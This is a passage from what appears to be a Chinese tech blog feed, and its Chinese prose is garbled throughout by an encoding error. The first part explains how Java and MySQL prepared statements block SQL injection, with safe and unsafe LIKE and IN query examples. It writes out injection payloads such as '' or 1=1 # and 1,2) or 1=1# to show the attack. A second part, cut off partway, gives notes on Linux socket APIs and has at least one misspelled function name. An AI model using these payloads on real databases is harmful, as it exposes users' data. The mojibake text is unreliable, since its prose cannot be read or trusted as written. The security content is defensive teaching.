<p>å¯ä»¥çœ‹åˆ°mysqlæœåŠ¡ç«¯å¯¹æˆ‘ä»¬ä¼ å…¥çš„å­—æ®µè¿›è¡Œäº†è½¬ä¹‰ï¼Œè§„é¿äº†å•å¼•å·çš„é—­åˆã€‚ä¸è¿‡è¯´åˆ°åº•é¢„ç¼–è¯‘çš„æœ¬èº«ç›®çš„è¿˜æ˜¯ä¸ºäº†æ€§èƒ½å’Œæ•ˆç‡ï¼Œæˆ‘è®¤ä¸ºå…¶é¢„é˜²SQLæ³¨å…¥åªæ˜¯å¤„ç†æ—¶åŠ ä¸Šçš„ä¸€ä¸ªç‰¹æ€§è€Œå·²ï¼ˆåŸ‹ä¸€ä¸ªå‘ï¼Œæœ‰æœºä¼šå»çœ‹çœ‹Mysqlæºç ï¼‰ã€‚</p>

<h2 id="å®¢æˆ·ç«¯é¢„ç¼–è¯‘">å®¢æˆ·ç«¯é¢„ç¼–è¯‘</h2>

<p>åœ¨<code class="language-plaintext highlighter-rouge">connnect</code>è¿æ¥æ—¶ï¼Œä¸è®¾ç½®<strong>useServerPrepStmts</strong>ï¼ˆé»˜è®¤ä¸ºfalseï¼‰ï¼Œåˆ™é‡‡ç”¨çš„æ˜¯é©±åŠ¨åŒ…ï¼ˆ<strong>mysql-connector-java</strong>ï¼‰å†…çš„å¤„ç†ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428130256.png" alt="image-20220428093236263" /></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428130300.png" alt="image-20220428094239596" /></p>

<p>ä¸Šå›¾å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¼ å…¥çš„<code class="language-plaintext highlighter-rouge">admin'</code>è¢«å¤„ç†ä¸ºäº†<code class="language-plaintext highlighter-rouge">'admin'''</code>ï¼Œæœ€å¤–å±‚çš„å•å¼•å·æ˜¯æœ¬èº«ä¼šåŠ ä¸Šçš„ï¼Œä¸è¿‡é¢„å¤„ç†æŠŠæˆ‘ä»¬é¢å¤–æ·»åŠ çš„å•å¼•å·ååˆè¿½åŠ äº†ä¸€ä¸ªå•å¼•å·ï¼Œè§„é¿äº†å…¶é—­åˆã€‚åŒæ—¶æ³¨æ„ä¸€ç‚¹wiresharkæŠ“åŒ…å¯è§åœ¨æœåŠ¡ç«¯å¹¶æ²¡æœ‰ <strong>Prepare</strong>çš„å¤„ç†ã€‚</p>

<p>æˆ‘ä»¬åœ¨  <code class="language-plaintext highlighter-rouge">preparedStatement.setString(1,username);</code>å¤„æ‰“ä¸‹æ–­ç‚¹ï¼Œå®šä½åˆ°<code class="language-plaintext highlighter-rouge">ClientPreparedQueryBindings.setString</code>:</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428130302.png" alt="image-20220428130231581" /></p>

<p>é€»è¾‘å…¶å®å¾ˆç®€å•ï¼Œå…ˆæ˜¯å¯¹æ£€æŸ¥ä¼ å…¥çš„å­—ç¬¦ä¸²å®¤å‹å­˜åœ¨<strong>Escaped</strong>å­—ç¬¦ï¼Œå¦‚æœå­˜åœ¨åˆ™æ ¹æ®å…·ä½“æƒ…å†µå¤„ç†ï¼Œæœ€åå†å¾€å‰åæ·»åŠ å•å¼•å·ã€‚å…¶å®ç®€å•æ¥çœ‹ä¹Ÿç›¸å½“äºæ˜¯ä¸€ä¸ªæ¶ˆæ¯’å¤„ç†ã€‚</p>

<p>ä¹‹å‰è¯´åˆ°å®¢æˆ·ç«¯å¤„çš„é¢„ç¼–è¯‘å¹¶æ²¡æœ‰å¾€æœåŠ¡ç«¯è¯·æ±‚ï¼Œç›¸å½“äºåªæ˜¯æœ¬åœ°çš„ä¸€ä¸ªç¼“å­˜ï¼Œé‚£æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨ä¿®æ”¹<code class="language-plaintext highlighter-rouge">SetValue </code>çš„å€¼ï¼Œæ¥è§‚å¯Ÿä¹‹åæ•°æ®åº“çš„æ‰§è¡Œã€‚</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">final</span> <span class="kd">synchronized</span> <span class="kt">void</span> <span class="nf">setValue</span><span class="o">(</span><span class="kt">int</span> <span class="n">paramIndex</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">val</span><span class="o">,</span> <span class="nc">MysqlType</span> <span class="n">type</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">bindValues</span><span class="o">[</span><span class="n">paramIndex</span><span class="o">].</span><span class="na">setByteValue</span><span class="o">(</span><span class="n">val</span><span class="o">);</span>
    <span class="k">this</span><span class="o">.</span><span class="na">bindValues</span><span class="o">[</span><span class="n">paramIndex</span><span class="o">].</span><span class="na">setMysqlType</span><span class="o">(</span><span class="n">type</span><span class="o">);</span>
<span class="o">}</span>
</code></pre></div></div>

<p>ä» <strong>setValue</strong> æ¥çœ‹æˆ‘ä»¬æœ€åè®¾ç½®çš„å€¼å­˜å‚¨åœ¨æ¥ <strong>bindValues</strong> ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯é€šè¿‡<code class="language-plaintext highlighter-rouge">Class.forName</code>è½½å…¥é©±åŠ¨åŒ…ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡åå°„ä¿®æ”¹å…¶å€¼ï¼Œä¸è¿‡ä¹Ÿå¯ä»¥åœ¨Debugçš„è¿‡ç¨‹ä¸­ç”¨ideaä¿®æ”¹ï¼š</p>

<pre><code class="language-txt">'' or 1=1 #
39 39 32 79 82 32 49 61 49 32 35 
</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428130305.png" alt="image-20220427214109417" /></p>

<p>ç›‘æ§çš„æ‰§è¡Œæƒ…å†µï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428130310.png" alt="image-20220427214524712" /></p>

<p>å‘ç°æ•°æ®åº“çš„ç¡®æ˜¯æ‰§è¡Œäº†æ³¨å…¥è¯­å¥ï¼Œæ‰“å°äº†æ‰€æœ‰usersä¿¡æ¯ã€‚</p>

<p>æŠ›å¼€ç¼–è¯‘ã€ASTç­‰çŸ¥è¯†ï¼Œç«™åœ¨å®‰å…¨çš„è§’åº¦æ¥è¯´æˆ‘è®¤ä¸ºé¢„ç¼–è¯‘ä¹‹æ‰€ä»¥èƒ½é˜²å¾¡sqlæ³¨å…¥è¿˜æ˜¯ä¸€ä¸ªæ¶ˆæ¯’å‡½æ•°çš„é—®é¢˜ï¼Œæœ¬è´¨ä¸Šè¿˜æ˜¯é€šè¿‡è½¬ä¹‰ã€è¿½åŠ ç­‰æ–¹å¼æ¥è§„é¿å•å¼•å·çš„é—­åˆï¼Œä»è€Œè®©æ•°æ®æ®µå’Œä»£ç æ®µä¸ä¼šæ··æ·†ã€‚</p>

<h2 id="é¢„ç¼–è¯‘æ‰€éœ€è¦æ³¨æ„çš„å‡ ç‚¹">é¢„ç¼–è¯‘æ‰€éœ€è¦æ³¨æ„çš„å‡ ç‚¹</h2>

<p>å¦‚æœä½ åœ¨é¢è¯•çš„æ—¶å€™ç®€å•è¯´ä¸€å¥é¢„ç¼–è¯‘ï¼Œé‚£ä¼¯åˆ†ä¹‹ä¼¯è¿˜ä¼šè¿½é—®ä¸€å¥ä½¿ç”¨é¢„ç¼–è¯‘éœ€è¦æ³¨æ„å“ªäº›åœ°æ–¹ï¼Œ</p>

<h3 id="å¯èƒ½å‡ºé”™çš„åœ°æ–¹">å¯èƒ½å‡ºé”™çš„åœ°æ–¹</h3>

<p>è¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯ä¸€äº›ç‰¹æ®Šçš„åœ°æ–¹ï¼Œé¢„ç¼–è¯‘çš„å†™æ³•éœ€è¦æ³¨æ„ã€‚</p>

<h4 id="likeè¯­å¥">likeè¯­å¥</h4>

<p>ä»¥ä¸‹ä¸¤ç§å†™æ³•éƒ½å¯ä»¥ï¼š</p>

<ol>
  <li>ä½¿ç”¨<code class="language-plaintext highlighter-rouge">concat</code>æ‹¼æ¥</li>
</ol>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">String</span> <span class="n">sql</span> <span class="o">=</span> <span class="s">"select * from users where username like concat('%',?,'%')\n "</span><span class="o">;</span>
<span class="nc">PreparedStatement</span> <span class="n">preparedStatement</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">sql</span><span class="o">);</span>
<span class="n">preparedStatement</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span><span class="s">"a"</span><span class="o">);</span>
<span class="nc">ResultSet</span> <span class="n">resultSet</span> <span class="o">=</span> <span class="n">preparedStatement</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
</code></pre></div></div>

<ol>
  <li>åœ¨setStringä¸­å†æ·»åŠ </li>
</ol>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">String</span> <span class="n">sql</span> <span class="o">=</span> <span class="s">"select * from users where username like ? "</span><span class="o">;</span>
<span class="nc">PreparedStatement</span> <span class="n">preparedStatement</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">sql</span><span class="o">);</span>
<span class="n">preparedStatement</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span><span class="s">"%a%"</span><span class="o">);</span>
<span class="nc">ResultSet</span> <span class="n">resultSet</span> <span class="o">=</span> <span class="n">preparedStatement</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
</code></pre></div></div>

<h4 id="inè¯­å¥">inè¯­å¥</h4>

<p>é”™è¯¯çš„å†™æ³•ï¼š</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">String</span> <span class="n">ids</span> <span class="o">=</span> <span class="s">"1,2"</span><span class="o">;</span>
<span class="c1">//String ids = "1,2) or 1=1#";</span>
<span class="nc">String</span> <span class="n">sql</span> <span class="o">=</span> <span class="s">"select * from users where id in ("</span><span class="o">+</span><span class="n">ids</span><span class="o">+</span><span class="s">")"</span><span class="o">;</span>
<span class="nc">Statement</span> <span class="n">statement</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">createStatement</span><span class="o">();</span>
<span class="nc">ResultSet</span> <span class="n">resultSet</span><span class="o">=</span>  <span class="n">statement</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">(</span><span class="n">sql</span><span class="o">);</span>
</code></pre></div></div>

<p>inè¯­å¥çš„é¢„ç¼–è¯‘ï¼Œæˆ‘ä»¬éœ€è¦ç¡®å®šé¢„ç¼–è¯‘çš„ä¸ªæ•°ï¼Œè¿™é‡Œé‡‡ç”¨åˆ†éš”ç¬¦çš„æ–¹æ³•åŒºåˆ†ã€‚</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">StringBuilder</span> <span class="n">temp</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
<span class="nc">String</span> <span class="n">ids</span> <span class="o">=</span> <span class="s">"1,2"</span><span class="o">;</span>
<span class="c1">// String ids = "1,2) or 1=1#,3";</span>
<span class="nc">String</span><span class="o">[]</span>  <span class="n">splitIds</span> <span class="o">=</span> <span class="n">ids</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">","</span><span class="o">);</span>
<span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span> <span class="n">splitIds</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++){</span>
    <span class="k">if</span><span class="o">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="o">){</span>
        <span class="n">temp</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"?"</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="n">temp</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">",?"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>

<span class="nc">String</span> <span class="n">sql</span> <span class="o">=</span> <span class="s">"select * from users where id in ("</span><span class="o">+</span><span class="n">temp</span><span class="o">+</span><span class="s">")"</span><span class="o">;</span>
<span class="nc">PreparedStatement</span> <span class="n">preparedStatement</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">sql</span><span class="o">);</span>

<span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">splitIds</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++){</span>
    <span class="n">preparedStatement</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="o">,</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">splitIds</span><span class="o">[</span><span class="n">i</span><span class="o">]));</span>
<span class="o">}</span>
<span class="nc">ResultSet</span> <span class="n">resultSet</span> <span class="o">=</span> <span class="n">preparedStatement</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
</code></pre></div></div>

<h3 id="æ— æ³•ä½¿ç”¨é¢„ç¼–è¯‘çš„åœºæ™¯">æ— æ³•ä½¿ç”¨é¢„ç¼–è¯‘çš„åœºæ™¯</h3>

<p>è¿™ä¸€æ–¹é¢ä¹ŸåŒæ ·å¯ä»¥é€šè¿‡æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¸¤ä¸ªæ–¹é¢å›ç­”ã€‚</p>

<p>é¦–å…ˆæ˜¯æœåŠ¡ç«¯ï¼Œçœ‹çœ‹å°è¯•å¯¹æŸ¥è¯¢çš„è¡¨åè¿›è¡Œé¢„ç¼–è¯‘ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">prepare stmt from 'select * from ? where username = ?';</code></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428193632.png" alt="image-20220428135058981" /></p>

<p>å‘ç°æŠ¥é”™äº†ï¼Œå…¶å®å¾ˆå¥½ç†è§£ï¼Œ<strong>è¡¨åå’Œåˆ—åæ˜¯ä¸èƒ½å¤Ÿè¢«é¢„ç¼–è¯‘çš„</strong>ï¼Œå› ä¸ºç”Ÿæˆè¯­æ³•æ ‘çš„è¿‡ç¨‹ä¸­ï¼Œé¢„å¤„ç†å™¨åœ¨è¿›ä¸€æ­¥æ£€æŸ¥è§£æåçš„è¯­æ³•æ ‘æ—¶ï¼Œ<strong>æ£€æŸ¥æ•°æ®è¡¨å’Œæ•°æ®åˆ—æ˜¯å¦å­˜åœ¨</strong>ï¼Œå¦‚æœè¿™ä¸¤ä¸ªå€¼æ˜¯å ä½ç¬¦<code class="language-plaintext highlighter-rouge">	?</code>æ‰€ä»£æ›¿ï¼Œè‡ªç„¶ä¼šæŠ¥é”™ã€‚</p>

<p>ä»é©±åŠ¨åŒ…çš„è§’åº¦ï¼Œä¹‹å‰æ‰€è¯´javaé¢„ç¼–è¯‘ä¼šåœ¨å ä½ç¬¦å‰åè‡ªåŠ¨æ·»åŠ ä¸¤ä¸ªå•å¼•å·ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ‰§è¡Œä»¥ä¸‹çš„è¯­å¥ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428193629.png" alt="image-20220428135913397" /></p>

<p>å®é™…ä¸Šæ‰§è¡Œçš„è¯­å¥ä¸ºï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220428193627.png" alt="image-20220428140036366" /></p>

<p>Mysqlè¡¨åä¸å…è®¸ä½¿ç”¨å•å¼•å·ï¼Œæ‰€ä»¥ä¼šæŠ¥è¯­æ³•é”™è¯¯ã€‚</p>

<p>é‚£åˆ—åå‘¢ï¼Œå½“ç„¶ä¹Ÿæ˜¯ä¸è¡Œï¼Œæ¯”å¦‚<code class="language-plaintext highlighter-rouge">select username from users where 'user_id' = 1 </code>ï¼Œè¿™é‡Œä¼šæŠŠ<code class="language-plaintext highlighter-rouge">'user_id'</code>å½“ä½œä¸€ä¸ªå…·ä½“çš„å€¼è€Œä¸æ˜¯åˆ—åï¼Œä»è€Œå¯¼è‡´æ‰§è¡Œç»“æœä¸ä¸€è‡´ã€‚</p>

<p>ç›´æ¥å¢åˆ æ”¹æŸ¥çš„è¡¨ååˆ—åä¸è¡Œï¼ŒåŒç†åƒç±»ä¼¼order byçš„åœ°æ–¹ï¼Œéœ€è¦ç”¨åˆ°åˆ—åæ¥æ’åºçš„åœ°æ–¹åŒæ ·ä¸è¡Œã€‚</p>

<p>é’ˆå¯¹ä¸Šè¿°å‡ ç§æƒ…å†µï¼Œæ¯”è¾ƒå¥½çš„æ–¹å¼è¿˜æ˜¯ä½¿ç”¨ç™½åå•ï¼Œæ¯•ç«Ÿè¡¨åå’Œåˆ—åå¤§å¤šæ—¶å€™æ˜¯æˆ‘ä»¬æå‰ç¡®å®šçš„å€¼ã€‚</p>]]></content><author><name>Theoyu</name></author><category term="JAVA" /><summary type="html"><![CDATA[ä¹‹å‰é¢è¯•é—®åˆ°äº†é¢„ç¼–è¯‘ç›¸å…³çš„é—®é¢˜ï¼Œæ„Ÿè§‰å›ç­”çš„ä¸æ˜¯å¾ˆå¥½ï¼Œé€šè¿‡å‡ ä¸ªä¾‹å­æ·±å…¥å­¦ä¹ ä¸€ä¸‹ã€‚]]></summary></entry><entry><title type="html">ã€Linuxé«˜æ€§èƒ½æœåŠ¡å™¨ç¼–ç¨‹ã€è¯»ä¹¦ç¬”è®°</title><link href="https://theoyu.top/2022/cource/LinuxServerProgram" rel="alternate" type="text/html" title="ã€Linuxé«˜æ€§èƒ½æœåŠ¡å™¨ç¼–ç¨‹ã€è¯»ä¹¦ç¬”è®°" /><published>2022-04-26T00:00:00+08:00</published><updated>2022-04-26T00:00:00+08:00</updated><id>https://theoyu.top/2022/cource/LinuxServerProgram</id><content type="html" xml:base="https://theoyu.top/2022/cource/LinuxServerProgram"><![CDATA[<!--more-->

<p>å¤§äºŒä¹°äº†è¿™æœ¬ä¹¦ä¸€ç›´æ²¡çœ‹ï¼Œæœ€è¿‘æœ‰Linuxè¿™é—¨è¯¾è¿˜æ˜¯ç®€å•è®°å½•äº†ä¸€ä¸‹ï¼ˆçº¯çº¯APIç¿»è¯‘å°èƒ½æ‰‹ï¼‰ã€‚æ„Ÿè§‰è™½ç„¶æ¶‰åŠçš„çŸ¥è¯†æ¯”è¾ƒå…¨ï¼Œä½†æ˜¯ä¸€äº›æˆ‘è§‰å¾—æ¯”è¾ƒé‡è¦çš„ç‚¹å´æ˜¯ä¸€ç¬”å¸¦è¿‡äº†ï¼Œä¸è¿‡å¥½åœ¨åœ¨APUEå’ŒUNPä¸­éƒ½æ‰¾åˆ°äº†ç­”æ¡ˆã€‚</p>

<h2 id="åŸºç¡€api">åŸºç¡€API</h2>

<h3 id="socketåŸºç¡€api">socketåŸºç¡€API</h3>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//1. ä¸»æœºåºå’Œç½‘ç»œå­—èŠ‚åºè½¬æ¢</span>
<span class="cp">#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp">
</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">int</span> <span class="nf">htonl</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">int</span> <span class="n">hostlong</span><span class="p">);</span> <span class="c1">// host to network long</span>
<span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="nf">htons</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="n">hostlong</span><span class="p">);</span> <span class="c1">// host to network short</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">int</span> <span class="nf">ntonhl</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">int</span> <span class="n">netlong</span><span class="p">);</span><span class="c1">//network to host long </span>
<span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="nf">ntohs</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="n">netlong</span><span class="p">);</span><span class="c1">//network to host short </span>
  
<span class="c1">//2. socketåœ°å€</span>
<span class="c1">//2.1 é€šç”¨socketç»“æ„ sockaddr</span>
<span class="k">struct</span> <span class="nc">sockaddr</span>
  <span class="p">{</span>
    <span class="n">sa_family_t</span> <span class="n">sa_family</span><span class="p">;</span>	<span class="cm">/* åœ°å€æ—ï¼ŒAF_XXX  */</span>
    <span class="kt">char</span> <span class="n">sa_data</span><span class="p">[</span><span class="mi">14</span><span class="p">];</span>		<span class="cm">/* Address data.åŒ…å«ç›®çš„åœ°å€å’Œç«¯å£ä¿¡æ¯  */</span>
  <span class="p">};</span>
<span class="cm">/*
  sa_family: 2å­—èŠ‚åœ°å€æ—ï¼š
    AF_UNIX :UNIXæœ¬åœ°åœ°å€æ—
    AF_INET :TCP/IPv4åœ°å€æ—
    AF_INET6:TCP/IPv6åœ°å€æ—
*/</span>

<span class="c1">//2.2 ä¸“ç”¨socketç»“æ„ sockaddr_inï¼Œä¸å‰è€…ç›¸æ¯”æŠŠportå’Œaddråˆ†å¼€å­˜å‚¨åˆ°äº†ä¸¤ä¸ªå˜é‡ä¸­</span>
<span class="k">struct</span> <span class="nc">sockaddr_in</span>
  <span class="p">{</span>
    <span class="n">sa_family_t</span> <span class="n">sin_family</span><span class="p">;</span>     <span class="cm">/* åœ°å€æ—ï¼ŒAF_XXX  */</span>
    <span class="n">in_port_t</span> <span class="n">sin_port</span><span class="p">;</span>			<span class="cm">/* ç«¯å£å·ï¼Œè¦ç”¨ç½‘ç»œå­—èŠ‚åº*/</span>
    <span class="k">struct</span> <span class="nc">in_addr</span> <span class="n">sin_addr</span><span class="p">;</span>	<span class="cm">/* IPv4åœ°å€ç»“æ„ä½“ï¼Œè§â†“ */</span>
  <span class="p">};</span>
<span class="c1">//å­˜å‚¨IPv4çš„æ•°æ®ç»“æ„</span>
<span class="k">struct</span> <span class="nc">in_addr</span>
  <span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">s_addr</span><span class="p">;</span> <span class="cm">/* IPv4åœ°å€ï¼Œè¦ç”¨ç½‘ç»œå­—èŠ‚åºè¡¨ç¤º*/</span>
  <span class="p">};</span>


<span class="c1">//3. IPåœ°å€è½¬æ¢å‡½æ•°</span>
<span class="cp">#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
</span><span class="c1">// å°†ç‚¹åˆ†åè¿›åˆ¶å­—ç¬¦ä¸²çš„IPv4åœ°å€, è½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åºæ•´æ•°è¡¨ç¤ºçš„IPv4åœ°å€. å¤±è´¥è¿”å›INADDR_NONE</span>
<span class="n">in_addr_t</span> <span class="nf">inet_addr</span><span class="p">(</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">strptr</span><span class="p">);</span>
<span class="cm">/*ä¾‹å¦‚ï¼š*/</span> <span class="n">sockaddr_in</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="o">=</span><span class="n">inet_addr</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">);</span>
 
<span class="c1">// åŠŸèƒ½ç›¸åŒä¸è¿‡è½¬æ¢ç»“æœå­˜åœ¨ inpæŒ‡å‘çš„ç»“æ„ä½“ä¸­. æˆåŠŸè¿”å›1 åä¹‹è¿”å›0</span>
<span class="kt">int</span> <span class="nf">inet_aton</span><span class="p">(</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cp</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">in_addr</span><span class="o">*</span> <span class="n">inp</span><span class="p">);</span>

<span class="c1">//å°†IPv4åœ°å€è½¬åŒ–ä¸ºç‚¹åˆ†åè¿›åˆ¶IPåœ°å€å­—ç¬¦ä¸²ï¼Œå’Œä¸Šè¿°ä¸¤ä¸ªå‡½æ•°åŠŸèƒ½ç›¸å</span>
<span class="c1">//è¯¥å‡½æ•°ä½¿ç”¨ä¸€ä¸ªå†…éƒ¨é™æ€å­˜å‚¨è½¬åŒ–ç»“æœï¼Œå‡½æ•°è¿”å›å€¼æŒ‡å‘è¯¥é™æ€å†…å­˜ï¼Œæ‰€ä»¥æ­¤å‡½æ•°æ˜¯ä¸å¯é‡å…¥çš„ï¼</span>
<span class="kt">char</span><span class="o">*</span> <span class="nf">inet_ntoa</span><span class="p">(</span><span class="k">struct</span> <span class="nc">in_addr</span> <span class="n">in</span><span class="p">);</span> 

<span class="c1">//ä»¥ä¸‹å‡½æ•°ä¹Ÿèƒ½å®Œæˆå‰é¢3ä¸ªå‡½æ•°åŒæ ·çš„åŠŸèƒ½ï¼Œå¹¶ä¸”åŒæ—¶é€‚ç”¨äºIPv4å’ŒIPv6</span>
<span class="c1">//å°†ç‚¹åˆ†åè¿›åˆ¶æˆ–è€…åå…­è¿›åˆ¶IPåœ°å€è½¬åŒ–ä¸ºç½‘ç»œå­—èŠ‚åºè¡¨ç¤ºçš„åœ°å€</span>
<span class="kt">int</span> <span class="nf">inet_pton</span><span class="p">(</span><span class="kt">int</span> <span class="n">af</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">src</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="n">dst</span><span class="p">);</span>
<span class="cm">/*
  af:åœ°å€æ— AF_INET or AF_INET6
  src:IPåœ°å€
  dst:è½¬åŒ–çš„åœ°å€
  æˆåŠŸè¿”å›1ï¼Œå¤±è´¥è¿”å›0å¹¶è®¾ç½®errno
*/</span>
<span class="c1">//å’Œä¸Šè¿°åŠŸèƒ½ç›¸å</span>
<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="nf">inet_ntop</span><span class="p">(</span><span class="kt">int</span> <span class="n">af</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span><span class="o">*</span>  <span class="n">src</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">dst</span><span class="p">,</span> <span class="n">socklen_t</span> <span class="n">cnt</span><span class="p">);</span>
<span class="cm">/*
  å‰ä¸‰è€…å’Œinet_ptonä¸€æ ·ï¼Œsrcå’Œdstäº¤æ¢äº†é¡ºåº
  cntæŒ‡å®šç›®æ ‡å­˜å‚¨å•å…ƒå¤§å°ï¼Œå¯ç”¨INET_ADDRSTRLEN, INET6_ADDRSTRLENè¡¨ç¤º
*/</span>

<span class="c1">//4. åˆ›å»ºsocket</span>
<span class="kt">int</span> <span class="nf">socket</span><span class="p">(</span><span class="kt">int</span> <span class="n">domain</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">protocol</span><span class="p">);</span>
<span class="cm">/*
  domain:åº•å±‚åè®®æ—
    PF_UNIX :UNIXæœ¬åœ°åè®®æ—
    PF_INET :TCP/IPv4åè®®æ—
    PF_INET6:TCP/IPv6åè®®æ—
    (åœ°å€æ—å’Œåè®®æ—äº‹å®ä¸Šæ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œåœ¨å‰UNIXæ—¶ä»£æœ‰æ‰€åŒºåˆ†ï¼Œåœ¨Linuxä¸Šå·²å®Œå…¨å…¼å®¹ï¼Œä¸è¿‡ä¸ºäº†è§„èŒƒåŒºåˆ†ä¸€ä¸‹ä¹Ÿè¡Œ)
  type:é€šè®¯ç±»å‹(æœåŠ¡ç±»å‹)
    SOCK_STREAM(æµæœåŠ¡ï¼ŒTCPåè®®)
    SOCK_DGRAM(æ•°æ®æŠ¥æœåŠ¡ï¼ŒUDPç±»å‹)
  protocol:é€šå¸¸ä¸º0
  socketè°ƒç”¨æˆåŠŸæ—¶è¿”å›ä¸€ä¸ªsocketæ–‡ä»¶æè¿°ç¬¦ï¼Œå¤±è´¥è¿”å›-1å¹¶è®¾ç½®errno
*/</span>

<span class="c1">//5. å‘½åsocket</span>
<span class="c1">//ä½œç”¨äºæœåŠ¡ç«¯ï¼Œå°†ä¸€ä¸ªsocketå’Œsocketåœ°å€è¿›è¡Œç»‘å®šç§°ä¸ºç»™socketå‘½å</span>
<span class="kt">int</span> <span class="nf">bind</span><span class="p">(</span><span class="kt">int</span> <span class="n">socket</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="nc">sockaddr</span><span class="o">*</span> <span class="n">my_addr</span><span class="p">,</span> <span class="n">socklen_t</span> <span class="n">addrlen</span><span class="p">);</span>
<span class="cm">/*
  socket:åˆ›å»ºsocketè¿”å›çš„æ–‡ä»¶æè¿°ç¬¦
  my_addr:my_addræ‰€æŒ‡çš„socketåœ°å€
  addrlen:socketç»“æ„é•¿åº¦
  æˆåŠŸè¿”å›0ï¼Œå¤±è´¥è¿”å›-1
*/</span>

<span class="c1">//6. ç›‘å¬socket</span>
